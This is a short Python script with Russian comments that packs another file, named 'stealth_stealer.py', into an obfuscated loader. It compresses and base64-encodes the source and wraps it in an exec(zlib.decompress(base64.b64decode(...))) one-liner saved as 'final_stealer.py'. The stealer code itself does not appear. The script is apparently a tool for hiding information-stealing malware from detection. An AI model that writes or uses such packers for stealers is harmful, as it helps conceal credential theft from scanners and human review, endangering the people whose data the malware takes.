import random, base64, zlib, marshal

def obfuscate(source_code):
    # Сжимаем + base64
    compressed = zlib.compress(source_code.encode())
    b64 = base64.b64encode(compressed).decode()
    # Создаём обфусцированный код
    template = f'''
import zlib, base64, marshal
exec(zlib.decompress(base64.b64decode({repr(b64)})))
'''
    return template

if __name__ == '__main__':
    with open('stealth_stealer.py', 'r', encoding='utf-8') as f:
        code = f.read()
    obf = obfuscate(code)
    with open('final_stealer.py', 'w', encoding='utf-8') as f:
        f.write(obf)
    print("Обфускация завершена -> final_stealer.py")